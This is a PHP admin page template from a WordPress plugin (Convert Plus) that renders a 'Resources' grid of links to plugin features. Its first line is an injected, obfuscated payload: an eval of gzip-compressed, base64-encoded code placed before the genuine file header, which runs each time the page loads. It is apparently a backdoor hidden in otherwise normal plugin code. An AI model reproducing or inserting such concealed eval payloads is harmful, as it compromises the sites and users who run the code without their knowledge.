<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );
?>
<div class="wrap bsf-page-wrapper ultimate-about">
	<div class="wrap-container">
		<div class="heading-section">
			<div class="bsf-pr-header bsf-left-header" style="margin-bottom: 55px;">
				<h2><?php echo __( 'Resources!', 'bsf' ); ?></h2>
				<div class="bsf-pr-decription"></div>
			</div>

			<div class="right-logo-section">
				<div class="bsf-company-logo">
				</div><!--company-logo-->
			</div><!--right-logo-section-->
		</div>	<!--heading section-->

		<div class="inside bsf-wrap">
			<div class="container">
				<?php
				if (
					( isset( $connects ) && ( true === $connects || 'true' === $connects ) ) ||
					( ! isset( $connects ) )
				) :
				?>
				<div class="col-sm-3 col-lg-3 resource-block-section">
					<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=contact-manager' ); ?>">
						<div class="resource-block-icon">
							<span class="dashicons dashicons-share"></span>
						</div>
						<div class="resource-block-content">
							<?php echo __( 'Connects', 'bsf' ); ?>
						</div>
					</a>
				</div><!--col-sm-3-->
			<?php endif; ?>

			<div class="col-sm-3 col-lg-3 resource-block-section">
				<a class="resource-block-link" href="<?php echo bsf_exension_installer_url( '14058953' ); ?>">
					<div class="resource-block-icon">
						<span class="dashicons dashicons-admin-plugins"></span>
					</div>
					<div class="resource-block-content">
						<?php echo __( 'Addons', 'bsf' ); ?>
					</div>
				</a>
			</div><!--col-sm-3-->

			<?php
			if (
				( isset( $icon_manager ) && ( true === $icon_manager || 'true' === $icon_manager ) ) ||
				( ! isset( $icon_manager ) )
			) :
			?>
			<div class="col-sm-3 col-lg-3 resource-block-section">
				<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=bsf-font-icon-manager' ); ?>">
					<div class="resource-block-icon">
						<span class="dashicons dashicons-awards"></span>
					</div>
					<div class="resource-block-content">
						<?php echo __( 'Font Icon Manager', 'bsf' ); ?>
					</div>
				</a>
			</div><!--col-sm-3-->
		<?php endif; ?>

		<?php
		if (
			( isset( $google_fonts ) && ( true === $google_fonts || 'true' === $google_fonts ) ) ||
			( ! isset( $google_fonts ) )
		) :
		?>
		<div class="col-sm-3 col-lg-3 resource-block-section">
			<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=bsf-google-font-manager' ); ?>">
				<div class="resource-block-icon">
					<span class="dashicons dashicons-edit"></span>
				</div>
				<div class="resource-block-content">
					<?php echo __( 'Google Fonts Manager', 'bsf' ); ?>
				</div>
			</a>
		</div><!--col-sm-3-->
	<?php endif; ?>

	<?php if ( class_exists( 'CP_Wp_Comment_Form' ) ) : ?>
		<div class="col-sm-3 col-lg-3 resource-block-section">
			<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=cp-wp-comment-form' ); ?>">
				<div class="resource-block-icon">
					<span class="dashicons dashicons-testimonial"></span>
				</div>
				<div class="resource-block-content">
					<?php echo __( 'WP Comment Form', 'bsf' ); ?>
				</div>
			</a>
		</div><!--col-sm-3-->
	<?php endif; ?>

	<?php if ( class_exists( 'CP_Wp_Registration_Form' ) ) : ?>
		<div class="col-sm-3 col-lg-3 resource-block-section">
			<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=cp-wp-registration-form' ); ?>">
				<div class="resource-block-icon">
					<span class="dashicons dashicons-welcome-write-blog"></span>
				</div>
				<div class="resource-block-content">
					<?php echo __( 'WP Registration Form', 'bsf' ); ?>
				</div>
			</a>
		</div><!--col-sm-3-->
	<?php endif; ?>

	<?php if ( class_exists( 'CP_Woocommerce_Checkout_Form' ) && class_exists( 'WooCommerce' ) ) : ?>
		<div class="col-sm-3 col-lg-3 resource-block-section">
			<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=cp-woocheckout-form' ); ?>">
				<div class="resource-block-icon">
					<span class="dashicons dashicons-cart"></span>
				</div>
				<div class="resource-block-content">
					<?php echo __( 'WooCommerce Checkout Form', 'bsf' ); ?>
				</div>
			</a>
		</div><!--col-sm-3-->
	<?php endif; ?>

	<?php if ( class_exists( 'CP_Contact_Form7' ) && class_exists( 'WPCF7' ) ) : ?>
		<div class="col-sm-3 col-lg-3">
			<a class="resource-block-link" href="<?php echo admin_url( 'admin.php?page=cp-contact-form7' ); ?>">
				<div class="resource-block-icon">
					<span class="dashicons dashicons-clipboard"></span>
				</div>
				<div class="resource-block-content">
					<?php echo __( 'Contact Form 7', 'bsf' ); ?>
				</div>
			</a>
		</div><!--col-sm-3-->
	<?php endif; ?>
</div><!--container-->

</div><!--bsf-wrap-->
</div><!--wrap-container-->
</div><!--wrap-->
